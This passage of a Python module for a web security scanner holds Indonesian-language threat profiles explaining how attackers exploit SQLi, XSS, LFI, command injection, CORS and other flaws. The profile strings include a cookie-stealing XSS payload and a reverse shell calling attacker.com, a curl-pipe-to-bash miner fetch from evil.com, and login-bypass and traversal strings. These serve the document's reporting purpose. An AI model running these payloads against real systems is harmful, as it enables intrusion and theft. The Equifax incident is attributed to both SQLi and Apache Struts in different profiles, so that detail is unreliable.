"""Threat intelligence: penjelasan celah + cara hacker mengeksploitasi.

Untuk setiap modul detector, kami sediakan:
- `description`: apa itu kelemahan ini, dengan bahasa yang mudah dimengerti
- `attack_scenarios`: skenario realistis bagaimana attacker mengeksploitasi
- `attack_chain`: step-by-step kill chain
- `real_world_impact`: contoh insiden nyata + dampak bisnis
- `who_is_at_risk`: profil korban yang biasanya jadi target

Data ini di-embed ke setiap finding pada saat build_bundle, sehingga
laporan HTML/PDF/TXT dan dashboard otomatis menampilkan section "Cara
hacker mengeksploitasi" tanpa perubahan di reporter.

Sumber rujukan dirangkum dari OWASP Top 10, MITRE ATT&CK, CWE, dan
public CVE writeups. Dirangkum jadi bahasa Indonesia untuk audience
non-teknis (manajemen) sambil tetap teknis untuk security team.
"""
from __future__ import annotations

from dataclasses import dataclass
from typing import Any


@dataclass
class ThreatProfile:
    """Penjelasan ancaman untuk satu kategori finding."""

    title: str                       # judul ringkas
    what_it_is: str                  # apa itu kelemahan ini
    why_dangerous: str               # kenapa berbahaya
    attack_scenarios: list[str]      # skenario eksploitasi
    attack_chain: list[str]          # step kill-chain
    real_world_impact: str           # contoh insiden + dampak
    who_is_at_risk: str              # profil korban
    mitre_techniques: list[str]      # MITRE ATT&CK technique IDs
    cwe_refs: list[str]              # CWE references

    def to_dict(self) -> dict[str, Any]:
        return {
            "title": self.title,
            "what_it_is": self.what_it_is,
            "why_dangerous": self.why_dangerous,
            "attack_scenarios": self.attack_scenarios,
            "attack_chain": self.attack_chain,
            "real_world_impact": self.real_world_impact,
            "who_is_at_risk": self.who_is_at_risk,
            "mitre_techniques": self.mitre_techniques,
            "cwe_refs": self.cwe_refs,
        }


# ---------------------------------------------------------------------------
# Threat profiles per module
# ---------------------------------------------------------------------------
# Catatan: kunci utama adalah `module` field dari Finding. Untuk finding
# yang lebih spesifik (mis. SQL Injection vs LFI), kami punya profile
# tersendiri per modul. Title dari finding tidak digunakan untuk lookup
# (terlalu rapuh) — kami pakai modul + optional CWE override.

_PROFILES: dict[str, ThreatProfile] = {
    # ---------- ACTIVE EXPLOITATION ----------
    "sqli": ThreatProfile(
        title="SQL Injection",
        what_it_is=(
            "SQL Injection (SQLi) adalah celah di mana input user dimasukkan "
            "ke query database tanpa sanitasi. Attacker bisa menyisipkan "
            "perintah SQL sendiri ke dalam query asli aplikasi."
        ),
        why_dangerous=(
            "Database biasanya menyimpan SEMUA aset paling berharga: "
            "kredensial user, data pribadi (PII), data finansial, log audit. "
            "Dengan SQLi attacker bisa membaca, mengubah, atau menghapus "
            "data ini — bahkan dalam kasus tertentu eksekusi command di server."
        ),
        attack_scenarios=[
            "Login bypass: ' OR '1'='1' -- pada form login menjadikan attacker login sebagai admin tanpa password.",
            "Data exfiltration: UNION SELECT untuk dump tabel users (username, password hash, email) ke layar.",
            "Blind SQLi: pakai response timing (SLEEP) atau boolean (1=1 vs 1=2) untuk extract data karakter-per-karakter walau output tidak ditampilkan.",
            "Lateral movement: SELECT INTO OUTFILE untuk menulis web shell (PHP/JSP) ke directory web, lalu RCE.",
            "Privilege escalation: pakai stored procedure (xp_cmdshell di MSSQL) untuk eksekusi OS command.",
        ],
        attack_chain=[
            "1. Reconnaissance: attacker scan parameter URL (?id=, ?search=, dll).",
            "2. Probing: kirim payload uji ('  \"  or 1=1) lihat response berbeda atau error SQL.",
            "3. Confirmation: pakai sqlmap atau payload time-based untuk konfirmasi.",
            "4. Database fingerprinting: identifikasi MySQL/PostgreSQL/MSSQL via fungsi spesifik.",
            "5. Enumeration: dump nama tabel, kolom, lalu data sensitif.",
            "6. Persistence: buat user baru di tabel admin, atau drop web shell.",
            "7. Cover tracks: hapus log error / audit table.",
        ],
        real_world_impact=(
            "Insiden nyata: TalkTalk 2015 (4 juta record bocor, denda £400rb), "
            "Heartland 2008 (130 juta kartu kredit, kerugian $140 juta), "
            "Equifax 2017 (147 juta data — dimulai dari SQLi). "
            "Dampak: kebocoran PII → denda regulator (GDPR/UU PDP), tuntutan class-action, "
            "kerusakan reputasi, kehilangan customer trust."
        ),
        who_is_at_risk=(
            "E-commerce, banking, healthcare, government — semua aplikasi yang "
            "menyimpan data user dan tidak pakai parameterized query."
        ),
        mitre_techniques=["T1190 (Exploit Public-Facing App)", "T1505.003 (Web Shell)"],
        cwe_refs=["CWE-89", "CWE-564"],
    ),

    "xss": ThreatProfile(
        title="Cross-Site Scripting (XSS)",
        what_it_is=(
            "XSS adalah celah di mana attacker bisa menyisipkan script JavaScript "
            "ke dalam halaman web yang dilihat user lain. Ada 3 jenis: Reflected "
            "(via URL parameter), Stored (tersimpan di DB), DOM-based (dieksekusi "
            "via JavaScript di sisi client)."
        ),
        why_dangerous=(
            "Script attacker berjalan di browser korban dengan privilege yang sama "
            "dengan website asli — bisa membaca cookie session (session hijacking), "
            "mengirim data form ke attacker (keylogging), bahkan mengubah tampilan "
            "halaman untuk phishing."
        ),
        attack_scenarios=[
            "Cookie theft: <script>fetch('https://attacker.com/?c='+document.cookie)</script> — attacker dapat session cookie korban dan login sebagai korban tanpa password.",
            "Phishing overlay: render form login fake di atas halaman asli; user ketik credential, langsung dikirim ke attacker.",
            "Keylogger: tangkap setiap keystroke di field input dan kirim real-time.",
            "BeEF hook: <script src='http://attacker.com/hook.js'></script> — kontrol penuh browser korban (kamera, geolocation, internal port scan).",
            "Worm: di social network/komentar, payload menyebar ke profil teman korban (kasus Samy worm 2005 — 1 juta MySpace user dalam 20 jam).",
        ],
        attack_chain=[
            "1. Cari input field/parameter yang outputnya dipantulkan ke halaman.",
            "2. Test reflection dengan payload sederhana: <h1>test</h1>.",
            "3. Jika di-encode, coba context-specific bypass (attribute injection, event handler).",
            "4. Buat payload final yang exfiltrate cookie atau muat hook.",
            "5. Kirim link ber-payload via email/social media ke target (Reflected XSS).",
            "6. Atau simpan payload di komentar/profil (Stored XSS) untuk korban masal.",
        ],
        real_world_impact=(
            "British Airways 2018 (380rb kartu kredit di-skim via Magecart XSS, "
            "denda £20 juta GDPR). eBay, Twitter, Yahoo — semua pernah kena. "
            "Stored XSS di forum/komentar bisa kompromise ribuan user sekaligus."
        ),
        who_is_at_risk=(
            "Aplikasi dengan user-generated content (komentar, profile, chat), "
            "dan aplikasi yang men-display query parameter di halaman tanpa encoding."
        ),
        mitre_techniques=["T1059.007 (JavaScript)", "T1539 (Steal Web Session Cookie)"],
        cwe_refs=["CWE-79", "CWE-80"],
    ),

    "lfi": ThreatProfile(
        title="Local File Inclusion / Path Traversal",
        what_it_is=(
            "Aplikasi mengizinkan input user mengontrol path file yang dibaca. "
            "Pakai `../../../` attacker bisa naik ke folder mana saja di server "
            "dan baca file rahasia."
        ),
        why_dangerous=(
            "Attacker bisa baca config file (.env, application.yml) yang berisi "
            "DB password & API key. Di Linux: /etc/passwd, /etc/shadow, AWS "
            "credentials. Di PHP, LFI sering bisa di-chain jadi RCE via "
            "log poisoning atau session file injection."
        ),
        attack_scenarios=[
            "Baca /etc/passwd untuk dapat list user system, lanjut bruteforce SSH.",
            "Baca config aplikasi (.env, config.php) untuk dapat DB credential.",
            "Baca AWS metadata 169.254.169.254/latest/meta-data/iam/security-credentials/ untuk hijack IAM role.",
            "PHP wrapper: php://filter/convert.base64-encode/resource=index.php untuk dump source code aplikasi → cari celah lain.",
            "LFI to RCE: poisoning Apache access log dengan PHP code via User-Agent, lalu include log file untuk eksekusi.",
        ],
        attack_chain=[
            "1. Identifikasi parameter yang load file (?page=, ?file=, ?lang=).",
            "2. Test traversal: ../../../etc/passwd. Cek apakah konten file muncul.",
            "3. Kalau filter ada (.php appended), coba null byte: file.php%00, atau wrapper php://filter.",
            "4. Dump source code aplikasi via base64 wrapper → cari secret/SQLi/RCE.",
            "5. Cari log file yang attacker bisa kontrol (access.log via UA), poisoning, then include → RCE.",
        ],
        real_world_impact=(
            "Capital One 2019 breach (100 juta data) dimulai dari SSRF + IAM "
            "credential theft via metadata endpoint — pola yang sama dengan LFI. "
            "Banyak exploit kit (RIG, Magnitude) pakai LFI sebagai entry point untuk drop ransomware."
        ),
        who_is_at_risk=(
            "PHP/Node aplikasi yang load template berdasarkan parameter, CMS dengan "
            "plugin yang load file dinamis (WordPress plugin LFI sangat sering)."
        ),
        mitre_techniques=["T1083 (File and Directory Discovery)", "T1552 (Unsecured Credentials)"],
        cwe_refs=["CWE-22", "CWE-98"],
    ),

    "cmdi": ThreatProfile(
        title="Command Injection",
        what_it_is=(
            "Aplikasi memanggil system command (mis. ping, ImageMagick, ffmpeg) "
            "dengan input user di-concatenate ke command string tanpa escaping. "
            "Attacker pakai metakarakter shell (; | & `$()`) untuk menyisipkan "
            "command sendiri."
        ),
        why_dangerous=(
            "Ini langsung Remote Code Execution (RCE) — attacker dapat eksekusi "
            "command apapun dengan privilege webserver. Game over: full server "
            "takeover, lateral movement ke server lain, deploy ransomware, "
            "eksfiltrasi seluruh database."
        ),
        attack_scenarios=[
            "Reverse shell: ; bash -i >& /dev/tcp/attacker.com/4444 0>&1 — attacker dapat shell interaktif di server.",
            "Cryptominer drop: ; curl http://evil.com/miner.sh | bash — server jadi cryptominer.",
            "Ransomware: enkripsi /var/www, /home, lalu drop ransom note.",
            "Pivot ke internal network: pakai server sebagai loncatan ke server database/AD yang tidak terekspos publik.",
            "Persistence: install backdoor service, tambah SSH key, modifikasi crontab.",
        ],
        attack_chain=[
            "1. Cari fitur yang panggil command line: ping, traceroute, image upload, file convert.",
            "2. Test metakarakter: ; pwd, | id, `whoami`.",
            "3. Konfirmasi RCE — output user/path/hostname muncul.",
            "4. Establish persistence (cron, SSH key, web shell).",
            "5. Privilege escalation: cek SUID binary, kernel exploit, sudo misconfig.",
            "6. Lateral movement: scan internal network, pivot ke aset lain.",
            "7. Exfiltrasi data, deploy payload final (ransomware/wiper/miner).",
        ],
        real_world_impact=(
            "Shellshock 2014 — bug bash yang memicu ribuan webserver di-compromise. "
            "Log4Shell 2021 — input ke logging library memicu RCE, paniknya seluruh "
            "industri selama berminggu-minggu. Ransomware grup (Conti, REvil) "
            "sering masuk via command injection di aplikasi internal."
        ),
        who_is_at_risk=(
            "Aplikasi yang melakukan operasi seperti convert image, generate PDF, "
            "ping/traceroute fitur diagnostik, file scanner — semua yang panggil shell."
        ),
        mitre_techniques=["T1059 (Command and Scripting Interpreter)", "T1190", "T1505.003"],
        cwe_refs=["CWE-77", "CWE-78"],
    ),

    "redirect": ThreatProfile(
        title="Open Redirect",
        what_it_is=(
            "Aplikasi me-redirect user ke URL yang ditentukan parameter query "
            "(mis. ?next=, ?return_url=) tanpa memvalidasi domain tujuan. Attacker "
            "bisa membuat link yang kelihatan dari domain asli tapi berakhir di "
            "site phishing."
        ),
        why_dangerous=(
            "Sendirinya rendah-medium, tapi sangat efektif untuk phishing. URL "
            "https://bank-asli.com/login?next=https://bank-asli-fake.com/ kelihatan "
            "sah karena domain bank-asli.com — user lebih percaya."
        ),
        attack_scenarios=[
            "Phishing 2.0: kirim email 'klik untuk reset password' dengan link bank-asli.com?next=evil. User tertipu karena lihat domain bank.",
            "OAuth token theft: redirect ke domain attacker yang tangkap access token di fragment URL.",
            "Credential harvesting: site phishing terlihat identik dengan login asli; user input password.",
            "Bypass URL filter: link blocklist tidak filter domain asli yang trusted.",
            "Cookie theft via redirect chain ke site attacker.",
        ],
        attack_chain=[
            "1. Cari endpoint dengan param ?next, ?url, ?redirect, ?return.",
            "2. Coba ganti dengan https://attacker.com — apakah user diarahkan ke sana?",
            "3. Kalau filter aktif, coba bypass: //attacker.com, /\\attacker.com, https:%2F%2Fattacker.com, atau @ trick: bank.com@attacker.com.",
            "4. Buat halaman phishing yang clone halaman asli.",
            "5. Kirim link ber-redirect via email, SMS, social media.",
            "6. Tunggu user klik dan input credential di halaman phishing.",
        ],
        real_world_impact=(
            "Microsoft Account, Google, dan banyak SaaS pernah punya open redirect "
            "yang dipakai untuk phishing skala besar. Karena URL terlihat dari "
            "domain trusted, click-through rate sampai 10x lebih tinggi dari "
            "phishing biasa."
        ),
        who_is_at_risk=(
            "Aplikasi dengan login flow yang punya post-login redirect, OAuth providers, "
            "fitur sharing link, email tracking links."
        ),
        mitre_techniques=["T1566.002 (Phishing: Spearphishing Link)"],
        cwe_refs=["CWE-601"],
    ),

    "dirlist": ThreatProfile(
        title="Directory Listing Enabled",
        what_it_is=(
            "Server web (Apache/Nginx) mengizinkan browsing isi folder yang tidak "
            "punya index.html. Attacker melihat semua file dalam folder dan bisa "
            "download langsung."
        ),
        why_dangerous=(
            "Sering folder yang exposed berisi backup file (.sql, .zip), log, "
            "source code (.git/), config (.env), atau file yang seharusnya "
            "tidak public — semua jadi mudah didownload."
        ),
        attack_scenarios=[
            "Download backup database: target.com/backup/ → site_2024.sql.gz → seluruh data dump.",
            "Source code theft: target.com/.git/ → clone repo via wget -r → dapat semua history kode termasuk credential yang pernah ter-commit.",
            "Find dev/staging endpoints: target.com/old/, target.com/test/ → API tanpa auth.",
            "Discover admin panel via unlisted folder: /admin-old/, /panel/.",
            "Map seluruh aplikasi dengan crawl recursive folder.",
        ],
        attack_chain=[
            "1. Pakai dirbuster/ffuf untuk enumerate folder umum (/backup, /old, /admin, /.git).",
            "2. Folder yang return 200 + listing → buka di browser.",
            "3. Download semua file yang ada (recursive: wget -r).",
            "4. Cari secret di config/env/git history.",
            "5. Pakai secret untuk login ke admin atau database.",
        ],
        real_world_impact=(
            "Banyak kebocoran besar dimulai dari .git/ atau .svn/ yang exposed: "
            "Uber 2016 (57 juta data) dimulai dari credential di GitHub history. "
            "Indonesia: beberapa instansi pemerintah pernah ketahuan expose .env "
            "dengan API key Midtrans/SMTP — fraud finansial langsung."
        ),
        who_is_at_risk=(
            "Aplikasi yang deploy manual tanpa CI/CD (file backup tertinggal), "
            "developer yang lupa exclude folder dari production, instansi yang "
            "tidak audit konfigurasi web server."
        ),
        mitre_techniques=["T1083 (File and Directory Discovery)", "T1213 (Data from Information Repositories)"],
        cwe_refs=["CWE-548"],
    ),

    # ---------- PASSIVE / CONFIG ----------
    "headers": ThreatProfile(
        title="Security Headers Missing",
        what_it_is=(
            "Browser punya mekanisme pertahanan built-in (CSP, HSTS, X-Frame-Options) "
            "yang hanya aktif kalau server kirim header yang sesuai. Tanpa header "
            "ini, browser tidak tahu apa yang boleh/tidak boleh dilakukan."
        ),
        why_dangerous=(
            "Tanpa CSP: XSS jauh lebih mudah berhasil. Tanpa HSTS: rentan "
            "downgrade attack (HTTPS dipaksa ke HTTP via MITM). Tanpa X-Frame-Options: "
            "rentan clickjacking. Headers ini adalah 'safety net' — tidak menambal "
            "celah utama tapi mencegah escalation."
        ),
        attack_scenarios=[
            "Clickjacking: attacker embed site Anda dalam <iframe> di site jahat, overlay button transparan agar user tidak sadar mengklik 'Transfer Rp 10jt'.",
            "MITM downgrade: di Wi-Fi publik, attacker strip HTTPS jadi HTTP, intercept credential. HSTS mencegah ini.",
            "MIME confusion: file di-upload sebagai gambar tapi browser eksekusi sebagai HTML/JS. X-Content-Type-Options: nosniff mencegah.",
            "Referer leakage: URL dengan token dikirim ke site eksternal. Referrer-Policy mencegah.",
            "XSS amplification: tanpa CSP, XSS yang ringan bisa langsung load script eksternal dan exfiltrate data.",
        ],
        attack_chain=[
            "1. Recon: cek header response dengan curl -I.",
            "2. Identifikasi header yang missing (HSTS, CSP, XFO, X-Content-Type-Options).",
            "3. Pilih attack vector sesuai header yang missing:",
            "   - Tidak ada HSTS → setup MITM (rogue Wi-Fi, ARP spoofing).",
            "   - Tidak ada XFO → buat clickjacking site.",
            "   - Tidak ada CSP → cari XSS, eksploitasi tanpa rintangan.",
            "4. Eksekusi serangan utama dengan defense-in-depth yang sudah hilang.",
        ],
        real_world_impact=(
            "Tinder 2018 — tanpa HSTS, attacker di Wi-Fi cafe bisa lihat siapa "
            "user swipe ke kanan/kiri. Slack, GitHub, banyak fintech menambah "
            "header ini dengan serius karena dampaknya besar saat digabung dengan celah lain."
        ),
        who_is_at_risk=(
            "Semua aplikasi web. Headers ini adalah hygiene dasar — kalau tidak "
            "ada, mengindikasikan tim ops belum hardening."
        ),
        mitre_techniques=["T1557 (Adversary-in-the-Middle)", "T1185 (Browser Session Hijacking)"],
        cwe_refs=["CWE-693", "CWE-1021"],
    ),

    "tls": ThreatProfile(
        title="TLS / SSL Issue",
        what_it_is=(
            "TLS adalah protokol enkripsi untuk HTTPS. Konfigurasi yang salah "
            "(versi lama, cipher lemah, sertifikat expired) membuat enkripsi "
            "bisa di-bypass atau didekripsi attacker."
        ),
        why_dangerous=(
            "Kalau enkripsi bisa di-break, semua traffic — termasuk password, "
            "session cookie, data PII — bisa dibaca attacker yang berada di "
            "jalur network (Wi-Fi cafe, ISP, government)."
        ),
        attack_scenarios=[
            "POODLE attack: paksa downgrade ke SSLv3 yang punya padding oracle, decrypt session cookie.",
            "BEAST: exploit CBC cipher di TLS 1.0 untuk recover plaintext bit-per-bit.",
            "Heartbleed (TLS 1.0/1.1 dengan OpenSSL bug): leak memory server termasuk private key & user password.",
            "Cert expired: browser warn user, tapi banyak yang klik 'Continue anyway'. Attacker setup MITM dengan cert palsu.",
            "Weak DH params: pre-compute attack (Logjam) decrypt traffic offline.",
        ],
        attack_chain=[
            "1. Scan target dengan testssl.sh atau sslyze untuk identifikasi versi & cipher.",
            "2. Identifikasi kelemahan: SSLv3? TLS 1.0? RC4? export-grade DH?",
            "3. Posisikan diri di network path (rogue AP, ARP spoofing, BGP hijack).",
            "4. Lakukan downgrade attack atau exploit cipher weak.",
            "5. Decrypt traffic, harvest session cookie / credential.",
            "6. Replay session ke server untuk login as user.",
        ],
        real_world_impact=(
            "Heartbleed 2014 — 17% dari seluruh HTTPS server kena, semua user "
            "session leak. Indonesia: beberapa instansi gov masih pakai TLS 1.0 "
            "dengan cipher RC4, mudah di-MITM di event kunjungan resmi."
        ),
        who_is_at_risk=(
            "Aplikasi banking, e-commerce, healthcare — semua yang transmit "
            "data sensitif. Khususnya yang exposed via mobile app (sering ada "
            "Wi-Fi MITM scenario)."
        ),
        mitre_techniques=["T1557.002 (ARP Cache Poisoning)", "T1040 (Network Sniffing)"],
        cwe_refs=["CWE-326", "CWE-327", "CWE-295"],
    ),

    "cookies": ThreatProfile(
        title="Insecure Cookie Configuration",
        what_it_is=(
            "Cookie session tidak punya flag Secure (boleh dikirim via HTTP), "
            "HttpOnly (bisa diakses JavaScript), atau SameSite (boleh dipakai "
            "lintas-site)."
        ),
        why_dangerous=(
            "Cookie session = identitas user. Tanpa proteksi, attacker bisa "
            "mencurinya via XSS, MITM, atau CSRF — lalu login sebagai user "
            "tanpa perlu password."
        ),
        attack_scenarios=[
            "Tidak HttpOnly + ada XSS = session theft via document.cookie. Attacker login sebagai victim instan.",
            "Tidak Secure = cookie ikut request HTTP. Attacker di Wi-Fi cafe sniff cookie via wireshark.",
            "Tidak SameSite + ada CSRF = attacker bisa eksekusi action atas nama victim (transfer dana, ubah email).",
            "Cookie tanpa expiry = walaupun user logout di browser lama, session masih valid jika cookie ter-leak.",
            "Cookie dengan domain .example.com (terlalu lebar) = bocor ke subdomain attacker bisa kontrol.",
        ],
        attack_chain=[
            "1. Login ke aplikasi sebagai test user, capture cookie.",
            "2. Inspect flag: ada Secure? HttpOnly? SameSite?",
            "3. Pilih vector sesuai flag yang missing:",
            "   - Missing HttpOnly → cari XSS, exfiltrate cookie.",
            "   - Missing Secure → setup MITM (Wi-Fi cafe).",
            "   - Missing SameSite → buat CSRF page di domain attacker.",
            "4. Curi cookie, replay ke server di browser sendiri.",
            "5. Gunakan session korban untuk akses akun, transfer, dll.",
        ],
        real_world_impact=(
            "British Airways, Ticketmaster, banyak forum tahun 2010-an — kombinasi "
            "XSS + cookie tanpa HttpOnly menyebabkan ribuan account hijack. "
            "Solusi defense-in-depth: cookie flags membuat exploit XSS jauh "
            "lebih sulit dieskalasi."
        ),
        who_is_at_risk=(
            "Aplikasi dengan session-based auth (mayoritas web app). Banking, "
            "e-commerce, social media."
        ),
        mitre_techniques=["T1539 (Steal Web Session Cookie)", "T1185"],
        cwe_refs=["CWE-614", "CWE-1004", "CWE-1275"],
    ),

    "cors": ThreatProfile(
        title="CORS Misconfiguration",
        what_it_is=(
            "Cross-Origin Resource Sharing (CORS) policy yang terlalu lebar — "
            "mis. Access-Control-Allow-Origin: * atau echo origin attacker — "
            "membuat site lain bisa membaca response API."
        ),
        why_dangerous=(
            "Browser normalnya block site A membaca data dari site B (Same-Origin "
            "Policy). CORS yang salah konfig membuka backdoor: attacker.com bisa "
            "membaca data sensitif dari api.bank.com seolah dari user yang sudah login."
        ),
        attack_scenarios=[
            "Attacker host evil.com dengan JavaScript yang fetch('https://api.bank.com/me') — kalau bank kirim ACAO: * with credentials, response bocor ke evil.com.",
            "ACAO echo origin tanpa whitelist → attacker pakai evil.bank.com.attacker.com, server echo balik origin attacker, request lewat.",
            "Null origin allowed → attacker pakai sandboxed iframe yang punya origin null untuk read API.",
            "Wildcard subdomain → kompromise satu subdomain (sering CMS/wiki) untuk read API utama.",
        ],
        attack_chain=[
            "1. Kirim OPTIONS preflight ke API endpoint dengan Origin: https://evil.com.",
            "2. Cek response: ada ACAO: https://evil.com? Ada ACAC: true?",
            "3. Kalau ada credentials=true + ACAO yang dikontrol → vulnerable.",
            "4. Buat halaman attacker dengan fetch(api, {credentials:'include'}).",
            "5. Phishing user supaya kunjungi halaman attacker (sambil masih login di bank).",
            "6. Halaman attacker tarik data sensitif dan kirim ke server attacker.",
        ],
        real_world_impact=(
            "Steam 2018 — CORS misconfig membuat game inventory user bisa dilihat "
            "site eksternal. Banyak fintech API yang bocor saldo/transaksi via CORS "
            "yang allow * with credentials (misalnya Postman Mock URL)."
        ),
        who_is_at_risk=(
            "REST API yang authentikasi via cookie (bukan token), khususnya yang "
            "punya frontend SPA terpisah dari backend (wajib config CORS dengan benar)."
        ),
        mitre_techniques=["T1190", "T1539"],
        cwe_refs=["CWE-942", "CWE-346"],
    ),

    "clickjacking": ThreatProfile(
        title="Clickjacking",
        what_it_is=(
            "Site Anda bisa di-embed dalam <iframe> di site jahat. Attacker overlay "
            "site Anda dengan tampilan menarik (game, video) sehingga user mengklik "
            "tombol di site Anda tanpa sadar."
        ),
        why_dangerous=(
            "User akan eksekusi action sensitif (delete account, transfer, follow, "
            "like) yang attacker target — tanpa user tahu."
        ),
        attack_scenarios=[
            "Likejacking: user klik 'play video' yang sebenarnya 'Like' di Facebook.",
            "Worm spread: like button auto-share, viral.",
            "Account deletion: tombol 'klaim hadiah' over tombol 'delete account'.",
            "Auto-follow: ribuan akun spammer dapat follower instan.",
            "OAuth approval: user setujui akses aplikasi attacker tanpa sadar.",
        ],
        attack_chain=[
            "1. Cek site target: bisa di-embed di iframe? (X-Frame-Options ada?)",
            "2. Identifikasi action sensitif yang one-click (transfer, delete, like).",
            "3. Buat halaman jebakan dengan iframe transparan yang overlay action button.",
            "4. Buat lure di atasnya (game, video, hadiah).",
            "5. Sebar link halaman jebakan via social media.",
            "6. User klik lure → sebenarnya klik di iframe → action terjadi.",
        ],
        real_world_impact=(
            "Facebook, Twitter, Adobe — semua pernah kena likejacking massal. "
            "Tahun 2010-an, Indonesia ada kasus auto-share status mesum yang "
            "viral karena clickjacking."
        ),
        who_is_at_risk=(
            "Site dengan one-click action (like, follow, vote, subscribe). "
            "Juga dashboard admin yang punya tombol delete/disable user."
        ),
        mitre_techniques=["T1185 (Browser Session Hijacking)"],
        cwe_refs=["CWE-1021", "CWE-451"],
    ),

    "methods": ThreatProfile(
        title="Dangerous HTTP Methods Enabled",
        what_it_is=(
            "Server menerima HTTP method yang seharusnya tidak diperlukan: TRACE "
            "(echo balik request), PUT (upload file), DELETE (hapus file), CONNECT."
        ),
        why_dangerous=(
            "TRACE bisa dipakai untuk Cross-Site Tracing (mencuri cookie HttpOnly). "
            "PUT/DELETE bisa dipakai untuk upload web shell atau hapus file. "
            "Method ini biasanya tidak diperlukan aplikasi modern."
        ),
        attack_scenarios=[
            "TRACE + XSS = curi cookie HttpOnly via XHR yang TRACE-back cookie ke attacker.",
            "PUT enabled tanpa auth = upload backdoor.php, akses langsung → RCE.",
            "DELETE enabled = hapus file index.html, defacement; atau hapus file kritis sehingga aplikasi crash.",
            "OPTIONS enumerate semua method yang aktif → attacker tahu attack surface.",
        ],
        attack_chain=[
            "1. curl -X OPTIONS site → cek Allow header.",
            "2. Test setiap method aneh: PUT /shell.php dengan body web shell.",
            "3. Kalau berhasil (201 Created), akses /shell.php → RCE.",
            "4. TRACE + XSS combo: payload XSS yang fetch dengan TRACE method → cookie ikut dipantulkan ke response → attacker baca via XHR.",
        ],
        real_world_impact=(
            "Banyak server lama (Apache <2.4, IIS) tidak disable method ini default. "
            "Kasus deface massal forum/blog tahun 2010-an sering pakai PUT method "
            "yang lupa di-disable."
        ),
        who_is_at_risk=(
            "Server yang config-nya default tanpa hardening, terutama IIS, Apache "
            "lama, atau WebDAV-enabled site."
        ),
        mitre_techniques=["T1505.003", "T1190"],
        cwe_refs=["CWE-650"],
    ),

    "sensitive_files": ThreatProfile(
        title="Sensitive File Exposure",
        what_it_is=(
            "File yang seharusnya tidak public bisa diakses langsung: .env, .git/, "
            ".svn/, backup.sql, config.php.bak, phpinfo.php, dll."
        ),
        why_dangerous=(
            ".env biasanya berisi DB_PASSWORD, API_KEY, SECRET_KEY. .git/ "
            "berisi seluruh source code + history (termasuk credential yang "
            "pernah ter-commit lalu di-revert). Backup database = full data dump. "
            "Semua ini langsung kompromise total."
        ),
        attack_scenarios=[
            "Download target.com/.env → DB_PASSWORD → connect ke DB langsung dari internet.",
            "Clone target.com/.git/ → dapat source code → audit untuk celah lain (SQLi, hardcoded admin password, dll).",
            "Download backup.sql.gz → user table + password hash → bruteforce offline → login admin.",
            "phpinfo.php → bocor PHP version (cari CVE), full path, env vars, modul aktif.",
            ".DS_Store → enumerate semua nama file di folder (macOS dev artifact).",
        ],
        attack_chain=[
            "1. Pakai dirsearch/ffuf dengan wordlist 'sensitive files' (1000+ kemungkinan).",
            "2. File yang return 200 + content match → vulnerable.",
            "3. Download file. Parse berdasarkan tipe:",
            "   - .env → ekstrak credential.",
            "   - .git/ → git clone via dirsearch atau gitdumper.",
            "   - .sql backup → grep password hash → bruteforce.",
            "4. Pakai credential untuk login penuh atau eksploitasi lebih dalam.",
        ],
        real_world_impact=(
            "Mayoritas data leak Indonesia di forum HitamWeb/RaidForums tahun "
            "2020-2023 dimulai dari .git/ atau .env exposed. KPU 2024 — sebagian "
            "leak diawali dari folder admin yang exposed. Uber, Snapchat, banyak "
            "startup Silicon Valley pernah kena."
        ),
        who_is_at_risk=(
            "Aplikasi PHP yang deploy via FTP manual, developer yang lupa add "
            ".env ke .gitignore, atau gitignore di production tapi server "
            "tetap serve folder .git."
        ),
        mitre_techniques=["T1083", "T1552.001 (Credentials in Files)", "T1213"],
        cwe_refs=["CWE-538", "CWE-540"],
    ),

    "robots": ThreatProfile(
        title="robots.txt Information Disclosure",
        what_it_is=(
            "File robots.txt mendaftarkan path yang seharusnya tidak di-crawl "
            "search engine, tapi malah jadi peta jalan untuk attacker."
        ),
        why_dangerous=(
            "Disallow: /admin/, Disallow: /backup/, Disallow: /api-internal/ — "
            "ini justru memberitahu attacker di mana harus mulai mencari celah. "
            "Robots.txt bukan security control, hanya hint untuk crawler."
        ),
        attack_scenarios=[
            "Lihat robots.txt → 'Disallow: /admin-v2/' → langsung kunjungi /admin-v2/, dapat login panel hidden.",
            "'Disallow: /backup/' → enumerate isi folder.",
            "'Disallow: /api/internal/' → API tanpa rate limit / auth lemah.",
            "Map seluruh internal URL space dari robots.txt + sitemap.xml.",
        ],
        attack_chain=[
            "1. curl https://target.com/robots.txt — selalu langkah pertama recon.",
            "2. Catat semua Disallow path.",
            "3. Test setiap path: ada login panel? Folder browseable? Admin?",
            "4. Pakai sebagai entry point ke serangan utama.",
        ],
        real_world_impact=(
            "Banyak penetration test report dimulai dari robots.txt: 'kami "
            "menemukan /staging/ via robots.txt yang ternyata copy production "
            "tanpa auth'. Skenario sangat umum."
        ),
        who_is_at_risk=(
            "Aplikasi enterprise dengan banyak environment (staging, dev, qa) "
            "yang naive memakai robots.txt untuk 'menyembunyikan'."
        ),
        mitre_techniques=["T1593.001 (Search Open Websites)"],
        cwe_refs=["CWE-200"],
    ),

    # ---------- RECON ----------
    "fingerprint": ThreatProfile(
        title="Technology Fingerprinting",
        what_it_is=(
            "Server membocorkan informasi versi software yang dipakai (Apache 2.2, "
            "PHP 5.6, jQuery 1.7, WordPress 4.x) via header atau body."
        ),
        why_dangerous=(
            "Versi spesifik = peta CVE. Apache 2.2 punya 50+ CVE publik, attacker "
            "tinggal pilih yang cocok. Tanpa fingerprint, attacker harus blind probe; "
            "dengan fingerprint, attack langsung tepat sasaran."
        ),
        attack_scenarios=[
            "Header 'Server: Apache/2.2.15' → cek CVE Apache 2.2.x → exploit yang aplikabel.",
            "X-Powered-By: PHP/5.6.40 → PHP 5.6 EOL, banyak CVE → upgrade RCE chain.",
            "WordPress version detection → cek vulnerable plugin → automated exploit.",
            "jQuery 1.7 → punya prototype pollution & XSS bug → augment XSS attack.",
        ],
        attack_chain=[
            "1. curl -I site, lihat Server, X-Powered-By, X-AspNet-Version.",
            "2. Body inspection: META generator, JS bundle versions.",
            "3. Map ke CVE database (CVE Details, NVD).",
            "4. Pilih exploit yang available (Metasploit, Exploit-DB).",
            "5. Eksekusi exploit — biasanya berhasil karena patching jarang dilakukan.",
        ],
        real_world_impact=(
            "Equifax 2017 dimulai dari Apache Struts 2 yang ter-fingerprint, "
            "lalu di-exploit dengan CVE yang 2 bulan sebelumnya sudah ada patch. "
            "Pola sama berulang setiap tahun."
        ),
        who_is_at_risk=(
